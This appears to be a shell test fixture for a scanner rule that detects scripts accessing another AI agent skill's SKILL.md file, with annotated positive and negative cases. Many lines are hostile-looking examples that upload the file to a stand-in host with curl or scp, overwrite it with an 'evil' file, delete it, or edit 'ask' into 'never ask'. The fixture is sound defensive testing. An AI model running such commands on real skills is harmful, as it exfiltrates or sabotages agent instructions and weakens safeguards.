#!/bin/sh
# Fixture only — never executed. One annotated instance per alternative of the rule
# named in the file name; `# ruleid:` names the rule the next line must draw.
# sh-peerbody:HIGH is a peer skill's body beside an access verb, one line per
# verb; sh-peerbody:MEDIUM is a mention with none.
# The two path forms.
# ruleid: sh-peerbody:HIGH
cat ../peer-skill/SKILL.md
# ruleid: sh-peerbody:HIGH
cat skills/other/SKILL.md
# The shell verbs, one line each.
# ruleid: sh-peerbody:HIGH
tac ../peer-skill/SKILL.md
# ruleid: sh-peerbody:HIGH
cp ../peer-skill/SKILL.md /tmp/copy
# ruleid: sh-peerbody:HIGH
mv /tmp/evil.md ../peer-skill/SKILL.md
# ruleid: sh-peerbody:HIGH
rm -f ../peer-skill/SKILL.md
# ruleid: sh-peerbody:HIGH
ln -sf /tmp/evil.md ../peer-skill/SKILL.md
# ruleid: sh-peerbody:HIGH
install -m 644 /tmp/evil.md ../peer-skill/SKILL.md
# ruleid: sh-peerbody:HIGH
rsync -a ../peer-skill/SKILL.md example.invalid:/drop/
# ruleid: sh-peerbody:HIGH
scp ../peer-skill/SKILL.md example.invalid:/drop/
# ruleid: sh-peerbody:HIGH
sed -i 's/ask/never ask/' ../peer-skill/SKILL.md
# ruleid: sh-peerbody:HIGH
awk 1 ../peer-skill/SKILL.md
# ruleid: sh-peerbody:HIGH
grep -n token ../peer-skill/SKILL.md
# ruleid: sh-peerbody:HIGH
rg token ../peer-skill/SKILL.md
# ruleid: sh-peerbody:HIGH
printf x | tee ../peer-skill/SKILL.md
# ruleid: sh-peerbody:HIGH
source ../peer-skill/SKILL.md
# ruleid: sh-peerbody:HIGH
head -n 40 ../peer-skill/SKILL.md
# ruleid: sh-peerbody:HIGH
tail -n 40 ../peer-skill/SKILL.md
# ruleid: sh-peerbody:HIGH
dd if=../peer-skill/SKILL.md of=/tmp/copy
# ruleid: sh-peerbody:HIGH
xxd ../peer-skill/SKILL.md
# ruleid: sh-peerbody:HIGH
od -c ../peer-skill/SKILL.md
# ruleid: sh-peerbody:HIGH
hexdump -C ../peer-skill/SKILL.md
# ruleid: sh-peerbody:HIGH
base64 ../peer-skill/SKILL.md
# ruleid: sh-peerbody:HIGH
tar czf /tmp/x.tgz ../peer-skill/SKILL.md
# ruleid: sh-peerbody:HIGH
zip /tmp/x.zip ../peer-skill/SKILL.md
# ruleid: sh-peerbody:HIGH
truncate -s 0 ../peer-skill/SKILL.md
# curl's upload flags, each one.
# ruleid: sh-peerbody:HIGH
curl -T ../peer-skill/SKILL.md https://example.invalid/u
# ruleid: sh-peerbody:HIGH
curl --upload-file ../peer-skill/SKILL.md https://example.invalid/u
# ruleid: sh-peerbody:HIGH
curl -F file=@../peer-skill/SKILL.md https://example.invalid/u
# ruleid: sh-peerbody:HIGH
curl --form file=@skills/other/SKILL.md https://example.invalid/u
# ruleid: sh-peerbody:HIGH
curl -d @../peer-skill/SKILL.md https://example.invalid/u
# ruleid: sh-peerbody:HIGH
curl --data @../peer-skill/SKILL.md https://example.invalid/u
# ruleid: sh-peerbody:HIGH
curl --data-binary @../peer-skill/SKILL.md https://example.invalid/u
# ruleid: sh-peerbody:HIGH
curl --data-raw @../peer-skill/SKILL.md https://example.invalid/u
# ruleid: sh-peerbody:HIGH
curl --data-urlencode body@../peer-skill/SKILL.md https://example.invalid/u
# A redirect onto the path, each form, and bash's $(<file) read.
# ruleid: sh-peerbody:HIGH
echo "override" > ../peer-skill/SKILL.md
# ruleid: sh-peerbody:HIGH
echo "override" >> skills/other/SKILL.md
# ruleid: sh-peerbody:HIGH
while read -r l; do :; done < ../peer-skill/SKILL.md
# ruleid: sh-peerbody:HIGH
run 2> ../peer-skill/SKILL.md
# ruleid: sh-peerbody:HIGH
run &> ../peer-skill/SKILL.md
# ruleid: sh-peerbody:HIGH
body="$(<skills/other/SKILL.md)"
# A trailing comment is not a comment line.
# ruleid: sh-peerbody:HIGH
echo ok # then cat ../peer-skill/SKILL.md
# A mention with no verb: MEDIUM, never HIGH. The path held in a variable is
# named here and read on a later line the rule cannot connect to it.
# ruleid: sh-peerbody:MEDIUM
printf '%s\n' ../peer-skill/SKILL.md
# ruleid: sh-peerbody:MEDIUM
PEER="../peer-skill/SKILL.md"
# ok: sh-peerbody
cat "$PEER"
# A key named like a verb is data, not the verb.
# ruleid: sh-peerbody:MEDIUM
echo '{"source": "skills/foo/SKILL.md"}'
# ruleid: sh-peerbody:MEDIUM
install=skills/foo/SKILL.md
# A < or > that is not a redirect onto the path: an HTML tag, a comparison.
# ruleid: sh-peerbody:MEDIUM
echo "<b>skills/foo/SKILL.md</b>"
# ruleid: sh-peerbody:MEDIUM
[ "$n" -gt 2 ] && x="a>b" && echo skills/foo/SKILL.md
# A $( whose command is no verb, and a verb word inside another word or a variable.
# ruleid: sh-peerbody:MEDIUM
dir=$(dirname skills/foo/SKILL.md)
# ruleid: sh-peerbody:MEDIUM
echo "$cat" my-cat foo.cat ../peer-skill/SKILL.md
# A comment line names nothing the shell reads.
# ok: sh-peerbody
# cat ../peer-skill/SKILL.md
